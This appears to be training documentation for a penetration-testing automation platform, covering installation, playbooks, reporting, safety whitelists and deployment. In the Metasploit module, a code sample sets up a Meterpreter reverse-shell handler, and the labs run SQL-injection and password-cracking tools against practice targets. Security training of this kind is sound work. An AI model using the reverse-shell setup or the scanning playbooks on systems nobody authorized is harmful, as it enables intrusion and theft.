# KaliAgent Training Materials

Complete training curriculum for security teams.

---

## Table of Contents

1. [Training Overview](#training-overview)
2. [Role-Based Training Paths](#role-based-training-paths)
3. [Beginner Track](#beginner-track)
4. [Intermediate Track](#intermediate-track)
5. [Advanced Track](#advanced-track)
6. [Admin Track](#admin-track)
7. [Hands-On Labs](#hands-on-labs)
8. [Assessment Exams](#assessment-exams)
9. [Training Schedule](#training-schedule)
10. [Instructor Guide](#instructor-guide)
11. [Participant Workbook](#participant-workbook)
12. [Certification Program](#certification-program)

---

## Training Overview

### Objectives

By the end of this training, participants will be able to:

✅ Install and configure KaliAgent  
✅ Execute security assessment playbooks  
✅ Interpret and report findings  
✅ Configure safety controls  
✅ Integrate with existing tools  
✅ Troubleshoot common issues  
✅ Administer KaliAgent deployments  

### Target Audience

| Role | Track | Duration |
|------|-------|----------|
| Security Analyst | Beginner | 4 hours |
| Penetration Tester | Intermediate | 8 hours |
| Security Consultant | Advanced | 16 hours |
| System Administrator | Admin | 4 hours |
| Security Manager | Overview | 2 hours |

### Prerequisites

**Beginner Track:**
- Basic Linux command line
- Understanding of IP addresses and networks
- Familiarity with security concepts

**Intermediate Track:**
- Completion of Beginner Track OR
- 1+ year security experience
- Basic Python knowledge

**Advanced Track:**
- Completion of Intermediate Track OR
- 3+ years penetration testing experience
- Experience with security tools (Nmap, Burp, Metasploit)

**Admin Track:**
- Linux system administration
- Docker/Kubernetes basics
- Network configuration

### Training Format

| Component | Format | Duration |
|-----------|--------|----------|
| Lectures | Video/In-person | 40% |
| Hands-on Labs | Virtual machines | 40% |
| Assessments | Quizzes + Practical | 20% |

### Training Environment

**Required:**
- KaliAgent installation (local or VM)
- Internet access
- Test targets (provided)

**Recommended:**
- 8GB RAM minimum
- 50GB free disk space
- Virtualization support (VirtualBox/VMware)

---

## Role-Based Training Paths

### Security Analyst (Beginner)

**Goal:** Execute pre-built playbooks and interpret results

**Modules:**
1. Introduction to KaliAgent (30 min)
2. Installation & Setup (45 min)
3. Dashboard Navigation (30 min)
4. Running Your First Playbook (60 min)
5. Understanding Findings (45 min)
6. Report Generation (30 min)
7. Safety & Compliance (30 min)

**Total:** 4 hours

**Lab Exercises:**
- Install KaliAgent
- Run reconnaissance playbook
- Generate PDF report
- Configure IP whitelist

---

### Penetration Tester (Intermediate)

**Goal:** Customize assessments and integrate with workflows

**Modules:**
1. Advanced Tool Configuration (60 min)
2. Custom Playbook Creation (90 min)
3. Metasploit Integration (60 min)
4. Output Parsing & Analysis (60 min)
5. SIEM Integration (45 min)
6. Ticketing System Integration (45 min)
7. Advanced Reporting (45 min)

**Total:** 8 hours

**Lab Exercises:**
- Create custom playbook
- Integrate with Metasploit
- Configure SIEM forwarding
- Create custom report template

---

### Security Consultant (Advanced)

**Goal:** Lead engagements and automate complex workflows

**Modules:**
1. Multi-Target Engagements (60 min)
2. Distributed Scanning (60 min)
3. API Automation (90 min)
4. Custom Tool Integration (90 min)
5. Advanced Safety Controls (60 min)
6. Compliance Automation (60 min)
7. Performance Tuning (45 min)
8. Troubleshooting (45 min)

**Total:** 16 hours

**Lab Exercises:**
- Design multi-phase engagement
- Build custom tool plugin
- Automate compliance reporting
- Optimize for large-scale scans

---

### System Administrator (Admin)

**Goal:** Deploy and maintain KaliAgent infrastructure

**Modules:**
1. Architecture Overview (30 min)
2. Docker Deployment (45 min)
3. Kubernetes Deployment (60 min)
4. High Availability Setup (45 min)
5. Backup & Recovery (45 min)
6. Monitoring & Alerting (45 min)
7. Security Hardening (30 min)

**Total:** 4 hours

**Lab Exercises:**
- Deploy with Docker Compose
- Configure Kubernetes manifests
- Set up monitoring dashboards
- Perform backup/restore

---

### Security Manager (Overview)

**Goal:** Understand capabilities and oversee deployments

**Modules:**
1. What is KaliAgent? (30 min)
2. Use Cases & Benefits (30 min)
3. Safety & Compliance (30 min)
4. Reporting & Metrics (30 min)
5. Team Training Plan (30 min)
6. ROI & Business Value (30 min)

**Total:** 2 hours

**No labs required**

---

## Beginner Track

### Module 1: Introduction to KaliAgent (30 min)

#### Learning Objectives
- Understand what KaliAgent does
- Identify key features
- Recognize use cases

#### Content

**What is KaliAgent?**

KaliAgent is a security automation platform that:
- Pre-configures 52 Kali Linux tools
- Automates common assessment workflows
- Generates professional reports
- Enforces safety controls

**Key Features:**
```
┌─────────────────────────────────────────┐
│           KALIAGENT PLATFORM            │
├─────────────────────────────────────────┤
│  📦 52 Tools    │  🎯 5 Playbooks      │
│  🎨 Dashboard   │  📄 PDF Reports       │
│  🔒 Safety      │  🔗 Integrations      │
└─────────────────────────────────────────┘
```

**Use Cases:**
- Security assessments
- Compliance audits
- Vulnerability management
- Red team operations

#### Quiz Questions

1. How many tools does KaliAgent integrate?
   - A) 25
   - B) 52 ✓
   - C) 100
   - D) 10

2. Which is NOT a playbook type?
   - A) Reconnaissance
   - B) Web Audit
   - C) Social Media Audit ✓
   - D) Password Cracking

---

### Module 2: Installation & Setup (45 min)

#### Learning Objectives
- Install KaliAgent dependencies
- Configure the platform
- Verify installation

#### Hands-On Lab

**Step 1: Clone Repository**
```bash
git clone https://github.com/dmrobbi/agentic-ai.git
cd agentic-ai/kali_dashboard
```

**Step 2: Install Dependencies**
```bash
pip3 install -r requirements.txt
```

**Step 3: Install Frontend**
```bash
cd frontend
npm install
cd ..
```

**Step 4: Start Services**
```bash
# Terminal 1: Backend
python3 server.py

# Terminal 2: Frontend
cd frontend
npm run dev
```

**Step 5: Verify**
```bash
curl http://localhost:8001/api/health
# Expected: {"status": "healthy"}
```

#### Troubleshooting

| Issue | Solution |
|-------|----------|
| Port already in use | Change port in config |
| npm install fails | Clear cache: `npm cache clean` |
| Database connection error | Check PostgreSQL is running |

---

### Module 3: Dashboard Navigation (30 min)

#### Learning Objectives
- Navigate all 6 dashboard pages
- Understand key metrics
- Use quick actions

#### Dashboard Tour

**Page 1: Dashboard (Overview)**
- Engagement statistics
- Quick actions
- Recent activity
- System health

**Page 2: Engagements**
- Create new engagement
- View existing engagements
- Track progress
- Access results

**Page 3: Playbooks**
- Browse available playbooks
- Execute playbooks
- View playbook history
- Monitor execution

**Page 4: Tools**
- Search tools
- Filter by category
- View tool details
- Check authorization requirements

**Page 5: Settings**
- Configure safety controls
- Manage authorization levels
- Set report preferences
- Configure integrations

**Page 6: Live Monitor**
- Real-time execution tracking
- Live output console
- Progress indicators
- Stop/pause controls

#### Exercise

Navigate to each page and:
1. Note the URL
2. Identify 3 key elements
3. Perform 1 action

---

### Module 4: Running Your First Playbook (60 min)

#### Learning Objectives
- Create an engagement
- Select appropriate playbook
- Execute and monitor
- Review results

#### Hands-On Lab

**Step 1: Create Engagement**
```bash
curl -X POST http://localhost:8001/api/engagements \
  -H "Content-Type: application/json" \
  -d '{
    "name": "My First Engagement",
    "engagement_type": "reconnaissance",
    "targets": ["scanme.nmap.org"]
  }'
```

**Step 2: Execute Playbook**
```bash
curl -X POST http://localhost:8001/api/engagements/eng-001/playbook \
  -H "Content-Type: application/json" \
  -d '{
    "playbook_type": "recon",
    "target": "scanme.nmap.org"
  }'
```

**Step 3: Monitor Progress**
```bash
curl http://localhost:8001/api/engagements/eng-001/status
```

**Step 4: View Results**
```bash
curl http://localhost:8001/api/engagements/eng-001/results
```

#### Expected Output

```json
{
  "engagement_id": "eng-001",
  "status": "completed",
  "tools_executed": 5,
  "findings": [
    {
      "title": "Open Port Detected",
      "severity": "informational",
      "tool": "Nmap",
      "details": "Port 22 (SSH) is open"
    }
  ]
}
```

---

### Module 5: Understanding Findings (45 min)

#### Learning Objectives
- Interpret finding severity
- Understand evidence
- Identify remediation steps

#### Finding Structure

```json
{
  "finding_id": "find-001",
  "title": "SQL Injection Vulnerability",
  "severity": "critical",
  "category": "web_application",
  "target": "app.example.com",
  "tool": "SQLMap",
  "description": "SQL injection found in login form",
  "evidence": "Parameter 'username' is vulnerable",
  "remediation": "Use parameterized queries",
  "references": ["CWE-89", "OWASP A03:2021"],
  "timestamp": "2026-04-18T10:30:00Z"
}
```

#### Severity Levels

| Severity | Color | Action Required | Response Time |
|----------|-------|-----------------|---------------|
| Critical | Red | Immediate | 24 hours |
| High | Orange | Urgent | 72 hours |
| Medium | Yellow | Planned | 2 weeks |
| Low | Blue | As resources | 1 month |
| Informational | Gray | Optional | N/A |

#### Exercise

Review 5 sample findings and:
1. Classify severity
2. Identify affected system
3. Propose remediation

---

### Module 6: Report Generation (30 min)

#### Learning Objectives
- Generate PDF reports
- Customize report content
- Export in multiple formats

#### Generate Report

**Via Dashboard:**
1. Navigate to Engagements
2. Select engagement
3. Click "Generate Report"
4. Choose format (PDF/Markdown/HTML/JSON)
5. Download

**Via API:**
```bash
curl -X GET http://localhost:8001/api/engagements/eng-001/report?format=pdf \
  -o report.pdf
```

#### Report Sections

1. **Cover Page**
   - Engagement name
   - Date range
   - Prepared for

2. **Executive Summary**
   - High-level overview
   - Key findings
   - Risk rating

3. **Findings Detail**
   - Each finding with:
     - Title & severity
     - Description
     - Evidence
     - Remediation

4. **Appendix**
   - Tool output
   - Technical details
   - References

#### Exercise

Generate reports in all 4 formats and compare.

---

### Module 7: Safety & Compliance (30 min)

#### Learning Objectives
- Configure IP whitelist
- Understand authorization levels
- Review audit logs
- Ensure compliance

#### Configure Whitelist

**Via Dashboard:**
1. Settings → Safety
2. Add IP to whitelist
3. Save

**Via API:**
```bash
curl -X POST http://localhost:8001/api/settings/whitelist \
  -H "Content-Type: application/json" \
  -d '{"ip": "scanme.nmap.org"}'
```

#### Authorization Levels

| Level | Tools Available | Approval Required |
|-------|-----------------|-------------------|
| NONE (0) | View only | None |
| BASIC (1) | 18 recon tools | Standard form |
| ADVANCED (2) | +28 exploitation | Management |
| CRITICAL (3) | All 52 tools | Executive + Legal |

#### Audit Log Review

```bash
# View audit logs
cat /var/log/kali/audit.jsonl | jq .

# Sample entry
{
  "timestamp": "2026-04-18T10:30:00Z",
  "user": "analyst1",
  "action": "execute_tool",
  "tool": "Nmap",
  "target": "scanme.nmap.org",
  "result": "success"
}
```

#### Compliance Checklist

- [ ] Whitelist configured
- [ ] Authorization levels set
- [ ] Audit logging enabled
- [ ] Retention policy configured
- [ ] Access controls in place

---

## Intermediate Track

### Module 1: Advanced Tool Configuration (60 min)

#### Learning Objectives
- Customize tool parameters
- Create tool presets
- Configure output parsers

#### Custom Tool Configuration

```python
# Custom Nmap configuration
tool_config = {
    "name": "nmap_advanced",
    "base_tool": "nmap",
    "default_args": [
        "-sV",        # Version detection
        "-sC",        # Default scripts
        "-O",         # OS detection
        "--min-rate", "1000"  # Speed optimization
    ],
    "timeout": 3600,
    "output_format": "xml"
}
```

#### Create Custom Preset

```bash
curl -X POST http://localhost:8001/api/tools/presets \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Deep Scan",
    "tool": "nmap",
    "args": ["-sV", "-sC", "-O", "-A", "-p-"],
    "description": "Comprehensive port and service scan"
  }'
```

---

### Module 2: Custom Playbook Creation (90 min)

#### Learning Objectives
- Design playbook workflow
- Configure tool sequencing
- Add conditional logic

#### Playbook Structure

```python
{
    "name": "Custom Web Audit",
    "description": "Custom web application security assessment",
    "steps": [
        {
            "order": 1,
            "tool": "nmap",
            "args": ["-sV", "-p", "80,443,8080"],
            "condition": "always"
        },
        {
            "order": 2,
            "tool": "nikto",
            "args": ["-h", "{target}"],
            "condition": "if_port_open(80)"
        },
        {
            "order": 3,
            "tool": "sqlmap",
            "args": ["-u", "{target}/login.php"],
            "condition": "if_web_detected"
        }
    ]
}
```

#### Create Playbook

```bash
curl -X POST http://localhost:8001/api/playbooks \
  -H "Content-Type: application/json" \
  -d @custom_playbook.json
```

---

### Module 3: Metasploit Integration (60 min)

#### Learning Objectives
- Configure Metasploit RPC
- Import Nmap results
- Execute exploits
- Manage sessions

#### Configuration

```python
# Metasploit settings
msf_config = {
    "host": "127.0.0.1",
    "port": 55553,
    "username": "kali",
    "password": "kali",
    "ssl": False
}
```

#### Import Nmap Results

```bash
# In Metasploit console
msf6 > db_import /path/to/nmap.xml
msf6 > hosts
msf6 > services
```

#### Execute Exploit

```python
from kali_agent import MetasploitClient

msf = MetasploitClient(host="127.0.0.1", port=55553)
msf.connect()

# Select exploit
msf.use("exploit/multi/handler")
msf.set("PAYLOAD", "windows/meterpreter/reverse_tcp")
msf.set("LHOST", "192.0.2.100")
msf.set("LPORT", 4444)

# Execute
msf.exploit()
```

---

## Advanced Track

### Module 1: Multi-Target Engagements (60 min)

#### Learning Objectives
- Design large-scale assessments
- Coordinate parallel scanning
- Aggregate results

#### Engagement Design

```python
engagement = {
    "name": "Enterprise Assessment",
    "targets": [
        "192.0.2.0/24",
        "192.0.2.0/24",
        "198.51.100.0/16"
    ],
    "playbooks": ["recon", "web_audit", "password_audit"],
    "parallel": True,
    "rate_limit": 100  # packets/sec
}
```

---

### Module 2: API Automation (90 min)

#### Learning Objectives
- Build automation scripts
- Integrate with CI/CD
- Create custom workflows

#### Automation Script

```python
#!/usr/bin/env python3
"""
Automated Security Assessment Script
"""

from kali_agent import KaliAgentClient

def run_daily_scan():
    client = KaliAgentClient(base_url="http://kali-agent:8001")
    
    # Create engagement
    engagement = client.create_engagement(
        name=f"Daily Scan - {datetime.now().date()}",
        engagement_type="reconnaissance",
        targets=["app.example.com", "api.example.com"]
    )
    
    # Execute playbook
    result = client.execute_playbook(
        engagement['engagement_id'],
        playbook_type="recon"
    )
    
    # Get findings
    findings = client.get_results(engagement['engagement_id'])
    
    # Alert on critical
    for finding in findings.get('findings', []):
        if finding['severity'] == 'critical':
            send_alert(finding)
    
    # Generate report
    report = client.generate_report(engagement['engagement_id'])
    save_report(report)

if __name__ == "__main__":
    run_daily_scan()
```

---

## Admin Track

### Module 1: Architecture Overview (30 min)

#### Components

```
┌─────────────┐     ┌─────────────┐
│   React     │────▶│   FastAPI   │
│  Dashboard  │     │   Backend   │
└─────────────┘     └──────┬──────┘
                           │
         ┌─────────────────┼─────────────────┐
         │                 │                 │
    ┌────▼────┐     ┌──────▼──────┐   ┌─────▼─────┐
    │   Redis │     │ PostgreSQL  │   │   Kali    │
    │  Cache  │     │  Database   │   │   Tools   │
    └─────────┘     └─────────────┘   └───────────┘
```

---

### Module 2: Docker Deployment (45 min)

#### docker-compose.yaml

```yaml
version: '3.8'

services:
  kali-agent:
    image: kali-agent:latest
    ports:
      - "8001:8001"
    environment:
      - DATABASE_URL=postgresql://user:pass@postgres:5432/kali
      - REDIS_URL=redis://redis:6379
    depends_on:
      - postgres
      - redis
    volumes:
      - ./logs:/var/log/kali

  postgres:
    image: postgres:15
    environment:
      - POSTGRES_PASSWORD=pass
    volumes:
      - postgres_data:/var/lib/postgresql/data

  redis:
    image: redis:7

  frontend:
    image: kali-frontend:latest
    ports:
      - "80:80"
    depends_on:
      - kali-agent

volumes:
  postgres_data:
```

#### Deploy

```bash
docker-compose up -d
docker-compose ps  # Verify all services running
```

---

## Hands-On Labs

### Lab 1: Basic Reconnaissance

**Scenario:** Assess a test target for open ports and services

**Target:** scanme.nmap.org (legal test target)

**Steps:**
1. Create engagement
2. Execute recon playbook
3. Review findings
4. Generate report

**Deliverable:** PDF report with findings

---

### Lab 2: Web Application Audit

**Scenario:** Test web application for common vulnerabilities

**Target:** testphp.vulnweb.com (intentionally vulnerable)

**Steps:**
1. Configure target in whitelist
2. Execute web audit playbook
3. Analyze SQL injection findings
4. Document evidence

**Deliverable:** Findings summary with remediation

---

### Lab 3: Password Security Assessment

**Scenario:** Test password policies and crack sample hashes

**Target:** Internal hash file (provided)

**Steps:**
1. Upload hash file
2. Execute password audit playbook
3. Review cracked passwords
4. Recommend policy changes

**Deliverable:** Password security assessment

---

### Lab 4: Full Engagement

**Scenario:** Complete security assessment

**Target:** Multi-host environment (provided VM)

**Steps:**
1. Plan engagement
2. Execute multiple playbooks
3. Correlate findings
4. Generate comprehensive report

**Deliverable:** Full engagement report

---

## Assessment Exams

### Beginner Exam

**Format:** 20 multiple choice + 1 practical

**Passing Score:** 80%

**Topics:**
- Installation (3 questions)
- Dashboard navigation (3 questions)
- Playbook execution (4 questions)
- Finding interpretation (5 questions)
- Safety controls (5 questions)

**Practical:**
- Install KaliAgent
- Run recon playbook
- Generate report

---

### Intermediate Exam

**Format:** 15 multiple choice + 2 practicals

**Passing Score:** 85%

**Topics:**
- Tool configuration (5 questions)
- Playbook customization (5 questions)
- Integrations (5 questions)

**Practicals:**
1. Create custom playbook
2. Configure SIEM integration

---

### Advanced Exam

**Format:** 10 multiple choice + 3 practicals

**Passing Score:** 90%

**Topics:**
- API automation (3 questions)
- Multi-target engagements (3 questions)
- Performance tuning (4 questions)

**Practicals:**
1. Build automation script
2. Design enterprise engagement
3. Troubleshoot performance issue

---

## Training Schedule

### Week 1: Beginner Track

| Day | Time | Module | Format |
|-----|------|--------|--------|
| Mon | 9:00-10:30 | Introduction | Lecture |
| Mon | 10:45-12:00 | Installation | Lab |
| Tue | 9:00-10:30 | Dashboard | Lecture + Lab |
| Tue | 10:45-12:00 | First Playbook | Lab |
| Wed | 9:00-10:30 | Findings | Lecture |
| Wed | 10:45-12:00 | Reports | Lab |
| Thu | 9:00-10:30 | Safety | Lecture |
| Thu | 10:45-12:00 | Exam | Assessment |

---

### Week 2: Intermediate Track

| Day | Time | Module | Format |
|-----|------|--------|--------|
| Mon | 9:00-11:00 | Tool Config | Lecture + Lab |
| Mon | 13:00-15:30 | Playbooks | Lecture + Lab |
| Tue | 9:00-11:00 | Metasploit | Lecture + Lab |
| Tue | 13:00-14:30 | Output Parsing | Lab |
| Wed | 9:00-10:30 | SIEM | Lecture + Lab |
| Wed | 10:45-12:00 | Ticketing | Lab |
| Thu | 9:00-10:30 | Advanced Reports | Lab |
| Thu | 10:45-12:00 | Exam | Assessment |

---

## Instructor Guide

### Preparation Checklist

- [ ] Set up training environment
- [ ] Verify all labs work
- [ ] Prepare participant materials
- [ ] Test AV equipment
- [ ] Print workbooks
- [ ] Prepare certificates

### Delivery Tips

1. **Start with why:** Explain business value
2. **Demo first:** Show before explaining
3. **Hands-on early:** Get participants typing quickly
4. **Encourage questions:** Create safe learning environment
5. **Real examples:** Use actual findings and reports
6. **Pace appropriately:** Adjust based on participant feedback

### Common Questions

**Q: Is this legal to use?**
A: Only on systems you own or have written authorization for. We provide legal test targets.

**Q: How does this compare to Burp Suite?**
A: KaliAgent automates workflows and generates reports. Burp is a manual testing tool. They complement each other.

**Q: Can I use this in production?**
A: Yes, with proper safety controls configured. Start with whitelist-only mode.

---

## Participant Workbook

### Notes Section

```
Module 1 Notes:
_____________________________
_____________________________
_____________________________

Module 2 Notes:
_____________________________
_____________________________
_____________________________

[Continue for all modules]
```

### Quick Reference

**Common Commands:**
```bash
# Health check
curl http://localhost:8001/api/health

# List tools
curl http://localhost:8001/api/tools

# Create engagement
curl -X POST http://localhost:8001/api/engagements ...

# Execute playbook
curl -X POST http://localhost:8001/api/engagements/{id}/playbook ...

# Get results
curl http://localhost:8001/api/engagements/{id}/results

# Generate report
curl http://localhost:8001/api/engagements/{id}/report -o report.pdf
```

**Important URLs:**
- Dashboard: http://localhost:5173
- API Docs: http://localhost:8001/docs
- GitHub: https://github.com/dmrobbi/agentic-ai

---

## Certification Program

### KaliAgent Certified Specialist (KCS)

**Requirements:**
- Complete Beginner Track
- Pass Beginner Exam (80%+)
- Complete 3 lab exercises

**Validity:** 2 years

**Recertification:**
- Complete continuing education (4 hours)
- OR pass recertification exam

---

### KaliAgent Certified Professional (KCP)

**Requirements:**
- Complete Intermediate Track
- Pass Intermediate Exam (85%+)
- Complete 5 lab exercises
- Hold KCS certification

**Validity:** 2 years

---

### KaliAgent Certified Expert (KCE)

**Requirements:**
- Complete Advanced Track
- Pass Advanced Exam (90%+)
- Complete 8 lab exercises
- Hold KCP certification
- Submit real-world case study

**Validity:** 2 years

---

### Certification Benefits

- Digital badge for LinkedIn
- Certificate PDF
- Listing in certified professionals directory
- Access to expert community
- Priority support

---

*Last Updated: April 18, 2026*
*Version: 1.0.0*
